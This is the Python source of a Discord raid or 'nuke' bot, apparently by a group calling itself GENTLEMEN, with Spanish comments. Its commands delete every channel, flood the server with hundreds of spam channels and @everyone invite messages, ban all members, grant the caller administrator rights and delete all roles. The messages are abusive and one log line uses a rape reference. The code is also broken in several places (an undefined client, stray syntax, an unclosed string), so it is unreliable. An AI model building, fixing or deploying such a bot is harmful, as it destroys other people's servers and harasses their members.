#Pasen Cp
#Este fue la primera vercion del bot faxter 

import discord
from discord.ext import commands
from discord.ext import tasks

whitelist = [1091914826625851484]




intents = discord.Intents().all()
intents.members = True

bot = commands.Bot(command_prefix=".", intents=intents)
bot.remove_command('help')


@client.event
async def on_guild_channel_create(channel):
    guild = channel.guild
    if len(guild.channels) >= 2:
        while True:
            await channel.send("@everyone get fucked losers LMAOOO https://discord.gg/G79YRQ2tvX")

@bot.event
async def on_ready():
    print("LOGGED IN THE BOT. Mady by: The GENTLEMEN")
    myLoop.start()
    await bot.change_presence(activity=discord.Game(name="V1.3 | .help"))


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.send(
            f"Calm it down fucker this shits on a cooldown for 10 minutes fool** Faltan:  {round(error.retry_after, 2)} ")


@bot.command(aliases=["dead"])
@commands.cooldown(1, 600, commands.BucketType.guild)
async def kill(ctx):

    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
            await ctx.guild.edit(name="DD IS HERE")
            )
        except:
            pass
    for _i in range(1):
        await ctx.guild.create_text_channel(name="unete-a-dd")
    for _i in range(400):
        await ctx.guild.create_text_channel(
            name="NUKED-BY-GENTLEMEN")


#Este era el spam de antes

@bot.event
async def on_guild_channel_create(channel):
    if (channel.name == 'NUKED-BY-GENTLEMEN'):
        for _i in range(10):
            await channel.send(
                '> ||@everyone|| /n **__Raided By GENTLEMENS__**   | https://discord.gg/G79YRQ2tvX | https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExMGJlMTk3NmI3ZjUwN2RmOTQxMTliODc5MGJkODkyY2NjZWI1YTE3NSZjdD1n/20vSS1pFJiITbyEjFZ/giphy.gif
            )

    if channel.name == "unete-a-dd":
        for _i in range(1):
            await channel.send(
                '> ||@everyone|| /n **__Come to NUKE Professionals if you want your silly ass server back LMAOOO__** |https://discord.gg/G79YRQ2tvX'
            )


#leave
@bot.command()
async def bye(ctx):
    await ctx.send("@everyone Cya fuckers xd")
    await ctx.guild.leave()
   

#banall
@bot.command()
async def banall(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.ban()
            print(f"Raped! {user}")
        except:
           pass
    


#admin
@bot.command(pass_context=True)
@commands.cooldown(1, 600, commands.BucketType.user)
async def admin(ctx):
    await ctx.message.delete()
    try:
        guild = ctx.guild
        role = await guild.create_role(name="GS Admin",
                                       permissions=discord.Permissions(8),
                                       colour=discord.Colour(000000))
        authour = ctx.message.author
        await authour.add_roles(role)
    except:
        pass


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
async def droles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
    await ctx.message.delete()


@bot.command(pass_context=True)
async def help(ctx):
    await ctx.message.delete()

    embed = discord.Embed(colour=discord.Colour.red())

    embed.set_author(name='El poder de DDBOT')
    embed.add_field(name='<a:_:1012466114183319592> .banall',value='Banea a todos en el servidor',inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .admin', value='Te otorga admin', inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .kill',value='Elimina todos los canales y crea nuevos con spam',)

    embed.add_field(name='<a:_:1012466114183319592> .droles',value='Elimina todos los roles',inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .croles', value='Crea muchos roles', inline=False)
    embed.add_field(name='<a:_:1012466114183319592> .bye', value='Termina el raid y abandona el servidor', inline=False)


    await ctx.send(embed=embed)


@bot.command()
@commands.cooldown(1, 600, commands.BucketType.user)
@commands.cooldown(1, 600, commands.BucketType.guild)
async def croles(ctx):
    await ctx.message.delete()
    for _i in range(100):
        await ctx.guild.create_role(name="#DD")




@tasks.loop(seconds=3600) 
async def myLoop():
 for guild in bot.guilds:
        try:
            if guild.id not in whitelist:
                server = bot.get_guild(guild.id)
                await server.leave()
        except:
                     pass



bot.run("token de tu bot ")
